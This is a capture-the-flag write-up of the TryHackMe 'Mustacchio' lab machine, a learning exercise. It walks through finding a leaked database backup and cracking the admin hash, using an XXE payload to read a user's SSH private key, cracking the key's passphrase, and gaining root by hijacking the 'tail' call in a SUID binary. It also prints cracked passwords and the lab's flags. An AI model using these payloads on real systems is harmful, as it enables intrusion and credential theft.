---
title: "TryHackMe: Mustacchio Write-up"
date: 2025-09-14 14:00:00
categories: [TryHackMe, Challenges]
tag: [Hijack Execution Flow, SUID, web, XXE]
author: Aisha
---

## Introduction

**Challenge Link:** [mustacchio](https://tryhackme.com/room/mustacchio)

Easy boot2root Machine

## Enumeration

Start with port scanning

```bash
 nmap 10.10.236.200 -sV -sC 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 22:05 +03
Nmap scan report for 10.10.236.200
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.96 seconds
                                                              
```

This is the web page. I inspect the source code but nothing interesting was found

![Alt](/images/Mustacchio/1.webp)

So I started directory fuzzing to look for hidden pages

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://10.10.236.200/ -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.200/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://10.10.236.200/images/]
/index.html           (Status: 200) [Size: 1752]
/contact.html         (Status: 200) [Size: 1450]
/about.html           (Status: 200) [Size: 3152]
/blog.html            (Status: 200) [Size: 3172]
/gallery.html         (Status: 200) [Size: 1950]
/custom               (Status: 301) [Size: 315] [--> http://10.10.236.200/custom/]
/robots.txt           (Status: 200) [Size: 28]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.236.200/fonts/]
```

We got two interesting pages. `robots.txt` and `custom`

**robots.txt page**

![Alt](/images/Mustacchio/2.webp)

**Custome page**

![Alt](/images/Mustacchio/3.webp)

On vising the `js` directory, I found a backup file called users 

![Alt](/images/Mustacchio/4.webp)

I downloaded the file, and it was an SQLite database file. 

```bash
$ file users.bak                    
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
                                                                                                                                                       
```

To view the content of the file, use `sqlite3` tool

```bash
$ sqlite3 users.bak 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users
   ...> 
   ...> ;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

We only have one table with one stored info. I used hash identifier tool to identify the hash 

```bash
$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
```

Then crack the admin hash with `john`

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt admin-hash.txt 
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 SSE2 4x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldog19        (?)     
1g 0:00:00:00 DONE (2025-09-10 22:41) 8.333g/s 5700Kp/s 5700Kc/s 5700KC/s bulldog27..bulldog04
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                      
                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/tryhackme/mustaccio]
└─$ john admin-hash.txt --show                                     
?:bulldog19

1 password hash cracked, 0 left
```

When I tried to SSH to the target machine, I got this error. This is because the ssh service is configured to accept only key-based authentication.

```bash
─$ ssh admin@10.10.236.200
admin@10.10.236.200: Permission denied (publickey).
```

So, I tried to search for another entry which is by scanning all open ports on the target machine

![Alt](/images/Mustacchio/5.webp)

And we got an open port on 8765. Access via the admin credentials we found on the users file. 

![Alt](/images/Mustacchio/6.webp)

On logging in, there is a comment section

![Alt](/images/Mustacchio/7.webp)

I inspected the source code, and found two interesting things: 

- One, is the Barry name configured on the SSH service.
- Second, is this section “`alert(”insert XML code”)`” and `/auth/dontforget.bak`

![Alt](/images/Mustacchio/8.webp)

This the `/auth/dontforget.bak` file:

```bash
$ cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

Since the comment section accepts XML content, I tried to see if it is vulnerable to an XXE attack. Refer to this [source](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) for XXE info. 

## XXE Exploit

I paste this malicious XML into the comment section to retrieve Barry’s SSH key

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM  "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>test</name>
  <author>test</author>
  <com>&xxe;</com>
</comment>
```

If success, you may need to fix the retrieved ssh key. Then save it to your machine and fix its permission to only be read by the current user. 

```bash
 $ chmod 600 clean-id-rsa 
                                                                                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Documents/tryhackme/mustaccio]
└─$ ssh barry@10.10.236.200 -i clean-id-rsa
Enter passphrase for key 'clean-id-rsa': 
Enter passphrase for key 'clean-id-rsa': 
barry@10.10.236.200: Permission denied (publickey).
                                                   
```

We still can't ssh to the Barry machine because the key is protected with a passphrase. We can crack it with john 

```python
$ ssh2john clean-id-rsa > id_rsa.hash                                              
```

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash                     
urieljames       (clean-id-rsa)     
                     
```

With the extracted passphrase, now SSH to Barry machine

## User Access

```bash
$ ssh barry@10.10.236.200 -i clean-id-rsa 
Enter passphrase for key 'clean-id-rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry)
barry@mustacchio:~$ ls /home
barry  joe
```

The user.txt can be found in the Barry folder. 

```python
barry@mustacchio:~$ ls /home/barry/user.txt 
/home/barry/user.txt
barry@mustacchio:~$ cat /home/barry/user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
```

## Root Access

View the sudoers file first, if nothing found there move to the next step which is searching for SUID binaries that can be abused to gain a root access.

```bash
barry@mustacchio:~$ find / -type f -perm -04000 -ls 2>/dev/null
    26223     84 -rwsr-xr-x   1 root     root        84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    29343     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
    29386     16 -rwsr-xr-x   1 root     root        14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    29788    112 -rwsr-xr-x   1 root     root       110792 Feb  8  2021 /usr/lib/snapd/snap-confine
    29776    420 -rwsr-xr-x   1 root     root       428240 May 26  2020 /usr/lib/openssh/ssh-keysign
    29454     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    24360     56 -rwsr-xr-x   1 root     root          54256 Mar 26  2019 /usr/bin/passwd
    24749     24 -rwsr-xr-x   1 root     root          23376 Mar 27  2019 /usr/bin/pkexec
    24359     72 -rwsr-xr-x   1 root     root          71824 Mar 26  2019 /usr/bin/chfn
    24265     40 -rwsr-xr-x   1 root     root          39904 Mar 26  2019 /usr/bin/newgrp
    24688     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
    24363     40 -rwsr-xr-x   1 root     root          40432 Mar 26  2019 /usr/bin/chsh
    24578     36 -rwsr-xr-x   1 root     root          32944 Mar 26  2019 /usr/bin/newgidmap
    24297    136 -rwsr-xr-x   1 root     root         136808 Jan 20  2021 /usr/bin/sudo
    24579     36 -rwsr-xr-x   1 root     root          32944 Mar 26  2019 /usr/bin/newuidmap
    24361     76 -rwsr-xr-x   1 root     root          75304 Mar 26  2019 /usr/bin/gpasswd
   257605     20 -rwsr-xr-x   1 root     root          16832 Jun 12  2021 /home/joe/live_log
      120     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
      119     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
      104     28 -rwsr-xr-x   1 root     root          27608 Jan 27  2020 /bin/umount
      103     40 -rwsr-xr-x   1 root     root          40152 Jan 27  2020 /bin/mount
      151     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
       87     40 -rwsr-xr-x   1 root     root          40128 Mar 26  2019 /bin/su
```

Notice there is a binary in Joe directory. 

```bash
$ file /home/joe/live_log 
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

When inspecting the binary, it showed that it continuously retrieving the new lines as they are added to the `access.log` file using `tail` command. 

![Alt](/images/Mustacchio/9.webp)

How to exploit this? If we can modify the PATH environment variable to add a writable directory, then we can execute [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/007/) . 

Change to the tmp directory then overwrite the `tail` binary to execute a bash shell, and add execution permission. 

```bash
barry@mustacchio:/tmp$ echo "/bin/bash" > tail
barry@mustacchio:/tmp$ chmod +x tail
```

Now when you execute the binary “live_log” with sudo rights, it will search for `tail` binary in the PATH env variable and will find it in the tmp folder, hence, executing our fake tail binary! 

![Alt](/images/Mustacchio/10.webp)

We can now search for the root flag. 

```bash
root@mustacchio:/root# cat 
.bashrc   .profile  root.txt  .ssh/     
root@mustacchio:/root# cat root.txt
3223581420d906c4dd1a5f9b530393a5
```

Done!.
